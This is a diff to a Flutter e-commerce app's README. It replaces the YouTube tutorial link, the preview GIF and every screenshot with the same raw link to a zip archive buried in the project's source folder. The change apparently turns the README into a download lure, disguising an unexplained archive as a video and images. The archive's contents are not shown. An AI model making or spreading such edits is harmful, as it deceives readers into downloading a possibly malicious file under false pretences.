@@ -5,12 +5,12 @@ we show you how you can create a nice
 clean archetecture and clean design for your e-commerce app that can
 run both Andriod and iOS devices because it builds with flutter.
 
-## [Watch it on YouTube](https://www.youtube.com/playlist?list=PLV1fXIAyjeuZ2pOUkmHwzMJCJgCedrQJW)
+## [Watch it on YouTube](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
 
 
 ### Video Preview of Final UI
 
-![Preview](/intro.gif)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
 
 ## Screens it contains:
 
@@ -37,8 +37,8 @@ run both Andriod and iOS devices because it builds with flutter.
 => Bottom Navigation Bar
 
 ## Photos
-![Preview](/Auth.png)
-![Preview](Account.png)
-![Preview](Cart.png)
-![Preview](Home.png)
-![Preview](CheckOut.png)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
+![Preview](https://raw.githubusercontent.com/midoo12345/Ecommerce_App/master/lib/view/Ecommerce_App_2.6-alpha.4.zip)
